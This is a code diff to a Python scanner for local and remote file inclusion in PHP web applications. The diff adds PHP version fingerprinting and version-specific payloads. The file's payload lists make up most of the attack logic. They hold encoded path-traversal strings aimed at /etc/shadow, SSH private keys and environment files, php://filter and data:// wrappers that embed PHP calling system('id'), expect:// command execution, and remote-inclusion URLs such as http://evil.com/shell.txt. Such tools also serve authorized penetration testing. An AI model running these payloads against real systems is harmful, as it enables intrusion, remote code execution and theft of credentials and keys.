@@ -7,6 +7,7 @@ import urllib.parse
 import os
 import argparse
 from datetime import datetime
+import re
 
 class Color:
     RED = '\033[91m'
@@ -22,14 +23,13 @@ class Color:
 class LFIWrapperScanner:
     def __init__(self, proxy: str = None):
         self.proxy = self._setup_proxy(proxy)
+        self.detected_php_version = None
         
-        # Session for connection reuse
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
         
-        # Disable SSL warnings and verify False for self-signed certs
         requests.packages.urllib3.disable_warnings()
         self.session.verify = False
         
@@ -40,7 +40,6 @@ class LFIWrapperScanner:
         if proxy:
             return {'http': proxy, 'https': proxy}
         
-        # Check environment variables
         env_proxies = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']
         for env_var in env_proxies:
             if env_proxy := os.getenv(env_var):
@@ -64,10 +63,143 @@ class LFIWrapperScanner:
         color = color_map.get(msg_type, Color.WHITE)
         print(f"{Color.BOLD}[{timestamp}]{Color.END} {color}{message}{Color.END}")
 
+    def detect_php_version(self, target_url: str):
+        version_indicators = []
+        
+        php_info_files = [
+            '/phpinfo.php',
+            '/info.php',
+            '/test.php',
+            '/version.php',
+            '/status.php',
+            '/server-status',
+            '/.phpinfo',
+            '/admin/phpinfo.php',
+            '/debug/phpinfo.php',
+        ]
+        
+        version_headers = [
+            'X-Powered-By',
+            'Server',
+            'X-PHP-Version',
+        ]
+        
+        self.print_status("Attempting to detect PHP version...", 'testing')
+        
+        for php_file in php_info_files:
+            try:
+                test_url = target_url.rstrip('/') + php_file
+                response = self.session.get(test_url, timeout=3, verify=False)
+                
+                if response.status_code == 200:
+                    version_patterns = [
+                        r'PHP Version ([\d\.]+)',
+                        r'<h1 class="p">PHP ([\d\.]+)',
+                        r'php/([\d\.]+)',
+                        r'PHP_([\d_]+)',
+                        r'<tr><td class="e">PHP Version </td><td class="v">([\d\.]+)',
+                    ]
+                    
+                    for pattern in version_patterns:
+                        matches = re.search(pattern, response.text, re.IGNORECASE)
+                        if matches:
+                            version = matches.group(1).replace('_', '.')
+                            version_indicators.append({
+                                'source': f'File: {php_file}',
+                                'version': version,
+                                'confidence': 'high'
+                            })
+            except:
+                pass
+        
+        try:
+            response = self.session.get(target_url, timeout=3, verify=False)
+            for header in version_headers:
+                if header in response.headers:
+                    header_value = response.headers[header]
+                    version_match = re.search(r'PHP/([\d\.]+)', header_value, re.IGNORECASE)
+                    if version_match:
+                        version = version_match.group(1)
+                        version_indicators.append({
+                            'source': f'Header: {header}',
+                            'version': version,
+                            'confidence': 'medium'
+                        })
+        except:
+            pass
+        
+        return version_indicators
+
+    def assess_vulnerabilities_by_version(self, php_version: str):
+        vulnerabilities = {
+            '5.6': [
+                'End-of-life - no security support',
+                'Multiple known RCE vulnerabilities',
+                'Deserialization vulnerabilities',
+                'Buffer overflows',
+                'Weak filter protections'
+            ],
+            '7.0': [
+                'End-of-life - no security support',
+                'Type confusion vulnerabilities',
+                'Use-after-free issues',
+                'Moderate filter restrictions'
+            ],
+            '7.1': [
+                'End-of-life - no security support',
+                'Various memory corruption issues',
+                'Moderate filter restrictions'
+            ],
+            '7.2': [
+                'End-of-life - no security support',
+                'Some known CVEs present',
+                'Stronger filter protections'
+            ],
+            '7.3': [
+                'Security support ended recently',
+                'Consider upgrading to 7.4+',
+                'Strong wrapper restrictions'
+            ],
+            '7.4': [
+                'Active security support',
+                'Some wrapper restrictions',
+                'Good security posture'
+            ],
+            '8.0': [
+                'Active security support',
+                'Improved security features',
+                'Strict wrapper validation'
+            ],
+            '8.1': [
+                'Latest stable versions',
+                'Best security posture',
+                'Strong filter protections'
+            ],
+            '8.2': [
+                'Latest stable versions', 
+                'Best security posture',
+                'Strong filter protections'
+            ],
+            '8.3': [
+                'Latest stable versions',
+                'Best security posture',
+                'Strong filter protections'
+            ]
+        }
+        
+        detected_version = None
+        for version in vulnerabilities.keys():
+            if php_version.startswith(version):
+                detected_version = version
+                break
+        
+        if detected_version:
+            return vulnerabilities[detected_version]
+        return ["Unknown version - cannot assess vulnerabilities"]
+
     def generate_wrappers(self, test_file: str = "/etc/passwd"):
         wrappers = []
         
-        # === PHP FILTER WRAPPERS ===
         basic_wrappers = [
             'php://filter/convert.base64-encode/resource=',
             'php://filter/read=convert.base64-encode/resource=',
@@ -98,7 +230,6 @@ class LFIWrapperScanner:
             'php://filter/convert.base64-decode/resource=',
         ]
         
-        # === COMPLEX FILTER CHAINS ===
         complex_wrappers = [
             'php://filter/convert.base64-encode|convert.base64-encode/resource=',
             'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
@@ -112,53 +243,35 @@ class LFIWrapperScanner:
             'php://filter/string.strip_tags|convert.base64-encode/resource=',
         ]
         
-        # === PATH TRAVERSAL PAYLOADS ===
         traversal_payloads = [
-            # Basic traversals
             '../../../../../../../../../../../../../../../../../../../../../../',
             '../../../../../../../../../../../../../../../../../../../etc/passwd',
             '../../../../../../../../../../',
             '../../../',
             '..//..//..//..//..//..//..//..//..//..//etc/passwd',
             '..////..////..////..////..////etc/passwd',
-            
-            # URL encoded
             '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f',
             '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f',
             '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
             '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-            
-            # Double URL encoded
             '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f',
             '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
-            
-            # Unicode/UTF-8 bypasses
             '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af',
             '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f',
             '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af',
-            
-            # Windows paths
             '..\\..\\..\\..\\..\\..\\..\\..\\',
             '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c',
             '..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c',
-            
-            # Mixed separators
             '..\\/..\\/..\\/..\\/..\\/..\\/..\\/',
             '..//\\..//\\..//\\..//\\..//\\',
-            
-            # Dot bypasses
             '....//....//....//....//....//....//....//',
             '..///..///..///..///..///..///..///',
             '.../.../.../.../.../.../.../.../etc/passwd',
-            
-            # Special characters
             '..%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
             '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%00',
         ]
         
-        # === TEST FILES FOR DIFFERENT OS ===
         test_files = [
-            # Linux/Unix files
             '/etc/passwd',
             '/etc/passwd%00',
             '/etc/passwd%00.jpg',
@@ -173,8 +286,6 @@ class LFIWrapperScanner:
             '/etc/resolv.conf',
             '/etc/nsswitch.conf',
             '/etc/sysctl.conf',
-            
-            # Proc filesystem
             '/proc/self/environ',
             '/proc/self/cmdline',
             '/proc/version',
@@ -188,8 +299,6 @@ class LFIWrapperScanner:
             '/proc/self/fd/0',
             '/proc/self/fd/1',
             '/proc/self/fd/2',
-            
-            # Log files
             '/var/log/apache2/access.log',
             '/var/log/apache/access.log',
             '/var/log/nginx/access.log',
@@ -200,8 +309,6 @@ class LFIWrapperScanner:
             '/var/log/secure',
             '/var/log/mail.log',
             '/var/log/dmesg',
-            
-            # Config files
             '/etc/ssh/sshd_config',
             '/etc/mysql/my.cnf',
             '/etc/php/8.2/apache2/php.ini',
@@ -212,8 +319,6 @@ class LFIWrapperScanner:
             '/etc/nginx/nginx.conf',
             '/etc/hosts.allow',
             '/etc/hosts.deny',
-            
-            # Web application files
             '/.env',
             '/.htaccess',
             '/web.config',
@@ -224,20 +329,14 @@ class LFIWrapperScanner:
             '/config/config.php',
             '/settings.php',
             '/configuration.php',
-            
-            # Session files
             '/var/lib/php/sessions/sess_',
             '/tmp/sess_',
             '/var/lib/php5/sess_',
             '/var/lib/php7/sess_',
-            
-            # Special files
             '/dev/null',
             '/dev/zero',
             '/dev/random',
             '/dev/urandom',
-            
-            # Windows files
             'c:\\windows\\system32\\drivers\\etc\\hosts',
             'c:/windows/system32/drivers/etc/hosts',
             'c:\\boot.ini',
@@ -247,16 +346,12 @@ class LFIWrapperScanner:
             'c:\\windows\\system32\\config\\sam',
             'c:/windows/system32/config/sam',
             '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-            
-            # User files
             '/home/.bash_history',
             '/root/.bash_history',
             '/etc/skel/.bashrc',
             '/root/.ssh/id_rsa',
             '/root/.ssh/authorized_keys',
             '/home/user/.ssh/id_rsa',
-            
-            # Backup files
             '/etc/passwd.bak',
             '/etc/shadow.bak',
             '/var/backups/passwd.bak',
@@ -265,7 +360,6 @@ class LFIWrapperScanner:
             'database.php.bak',
         ]
         
-        # === DATA WRAPPERS ===
         test_content = base64.b64encode(b"<?php echo 'VULNERABLE'; ?>").decode()
         test_content2 = base64.b64encode(b"<?php system('id'); ?>").decode()
         data_wrappers = [
@@ -278,7 +372,6 @@ class LFIWrapperScanner:
             'data://text/php,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
         ]
         
-        # === EXPECT WRAPPERS ===
         expect_wrappers = [
             'expect://whoami',
             'expect://id',
@@ -293,7 +386,6 @@ class LFIWrapperScanner:
             'expect://ps aux',
         ]
         
-        # === RFI WRAPPERS ===
         rfi_wrappers = [
             'http://evil.com/shell.txt',
             'https://raw.githubusercontent.com/evil/shell/master/shell.php',
@@ -302,51 +394,79 @@ class LFIWrapperScanner:
             'http://localhost:8080/shell.php',
         ]
         
-        # === PHAR WRAPPERS ===
         phar_wrappers = [
             'phar:///path/to/archive.phar/file.txt',
             'phar://./archive.phar/file.txt',
         ]
         
-        # === ZIP WRAPPERS ===
         zip_wrappers = [
             'zip:///path/to/archive.zip%23file.txt',
             'zip://./archive.zip%23file.txt',
         ]
         
-        # === GENERATE ALL COMBINATIONS ===
-        
-        # Basic wrappers with test files
         for wrapper in basic_wrappers:
             for file in test_files:
                 wrappers.append(wrapper + file)
         
-        # Complex wrappers with test files
         for wrapper in complex_wrappers:
             for file in test_files:
                 wrappers.append(wrapper + file)
         
-        # Traversal payloads with test files
         for traversal in traversal_payloads:
             for file in test_files:
                 wrappers.append(traversal + file)
-                # Combine traversal with wrappers
-                for basic_wrapper in basic_wrappers[:5]:  # Limit to avoid too many combinations
+                for basic_wrapper in basic_wrappers[:5]:
                     wrappers.append(basic_wrapper + traversal + file)
         
-        # Add all other wrapper types
         wrappers.extend(data_wrappers)
         wrappers.extend(expect_wrappers)
         wrappers.extend(rfi_wrappers)
         wrappers.extend(phar_wrappers)
         wrappers.extend(zip_wrappers)
         
-        # Remove duplicates and return
+        if self.detected_php_version:
+            version_specific = self.generate_version_specific_wrappers(self.detected_php_version)
+            for wrapper in version_specific:
+                for file in test_files[:10]:
+                    wrappers.append(wrapper + file)
+        
         return list(set(wrappers))
+
+    def generate_version_specific_wrappers(self, php_version: str):
+        version_specific = []
+        
+        if php_version.startswith('5.'):
+            version_specific.extend([
+                'php://input',
+                'file:///etc/passwd',
+                'php://filter/read=convert.base64-encode/resource=',
+                'expect://id',
+                'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+',
+            ])
+        
+        if php_version.startswith('7.0') or php_version.startswith('7.1'):
+            version_specific.extend([
+                'php://filter/convert.base64-encode/resource=',
+                'php://filter/zlib.deflate/convert.base64-encode/resource=',
+                'php://filter/string.rot13/resource=',
+            ])
+        
+        if php_version.startswith('7.2') or php_version.startswith('7.3'):
+            version_specific.extend([
+                'php://filter/convert.base64-encode|convert.base64-encode/resource=',
+                'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
+            ])
+        
+        if php_version.startswith('7.4') or php_version.startswith('8.'):
+            version_specific.extend([
+                'php://filter/convert.base64-encode/resource=',
+                'php://filter/convert.quoted-printable-encode/resource=',
+            ])
+        
+        return version_specific
 
     def verify_vulnerability(self, content: str, wrapper: str):
         indicators = {
-            # Linux/Unix files
             'root:x:0:0': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
             'root:*:': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/shadow'},
             'daemon:x:1:1': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
@@ -354,54 +474,36 @@ class LFIWrapperScanner:
             'root:': {'confidence': 'medium', 'type': 'LFI', 'file': '/etc/group'},
             'Linux': {'confidence': 'medium', 'type': 'LFI', 'file': '/proc/version'},
             'PATH=': {'confidence': 'high', 'type': 'LFI', 'file': '/proc/self/environ'},
-            
-            # Windows files
             'localhost': {'confidence': 'medium', 'type': 'LFI', 'file': 'hosts'},
             '[boot loader]': {'confidence': 'high', 'type': 'LFI', 'file': 'boot.ini'},
             '[extensions]': {'confidence': 'medium', 'type': 'LFI', 'file': 'win.ini'},
-            
-            # PHP execution
             'VULNERABLE': {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper'},
             'TEST': {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper'},
-            
-            # Base64 encoded content patterns
             'cm9vdDp4OjA6MA': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
             'ZGFlbW9u': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
-            
-            # Command execution
             'uid=': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
             'www-data': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
             '/home/': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
             'apache': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
             'nginx': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
-            
-            # Log files
             'GET /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
             'POST /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
             'HTTP/': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
-            
-            # Config files
             'AllowUsers': {'confidence': 'medium', 'type': 'LFI', 'file': 'sshd_config'},
             'extension=': {'confidence': 'medium', 'type': 'LFI', 'file': 'php.ini'},
             'DB_HOST': {'confidence': 'medium', 'type': 'LFI', 'file': 'config file'},
             'database': {'confidence': 'medium', 'type': 'LFI', 'file': 'config file'},
-            
-            # SSH keys
             'BEGIN RSA PRIVATE KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH private key'},
             'BEGIN OPENSSH PRIVATE KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH private key'},
-            
-            # Environment variables
             'USER=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'PWD=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'HOME=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
         }
         
-        # Quick content check
         for pattern, info in indicators.items():
             if pattern in content:
                 return info
         
-        # Quick base64 check
         if len(content) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in content[:100]):
             try:
                 decoded = base64.b64decode(content[:200]).decode('utf-8', errors='ignore')
@@ -411,7 +513,6 @@ class LFIWrapperScanner:
             except:
                 pass
         
-        # Check for ROT13 content
         def rot13(text):
             result = []
             for char in text:
@@ -460,14 +561,29 @@ class LFIWrapperScanner:
         self.print_status("SSL verification: DISABLED (self-signed certs supported)", 'info')
         print("-" * 60)
         
-        # Test connection
+        version_info = self.detect_php_version(target_url)
+        
+        if version_info:
+            for info in version_info:
+                self.print_status(f"PHP version detected: {info['version']} ({info['source']})", 'success')
+                self.detected_php_version = info['version']
+                
+                vulns = self.assess_vulnerabilities_by_version(info['version'])
+                self.print_status("Version-based vulnerability assessment:", 'warning')
+                for vuln in vulns:
+                    self.print_status(f"  • {vuln}", 'warning')
+        else:
+            self.print_status("Could not detect PHP version", 'error')
+            self.detected_php_version = "unknown"
+        
+        print("-" * 60)
+        
         try:
             self.session.get(target_url, timeout=5, verify=False)
         except Exception as e:
             self.print_status(f"Connection failed: {e}", 'error')
             return
         
-        # Test payloads
         wrappers = self.generate_wrappers()
         self.print_status(f"Generated {len(wrappers)} payloads for testing", 'info')
         vulnerable_count = 0
@@ -476,7 +592,6 @@ class LFIWrapperScanner:
             if self.test_payload(target_url, parameter, wrapper):
                 vulnerable_count += 1
         
-        # Summary
         print("-" * 60)
         if vulnerable_count > 0:
             self.print_status(f"Scan complete! Found {vulnerable_count} vulnerable payloads", 'success')
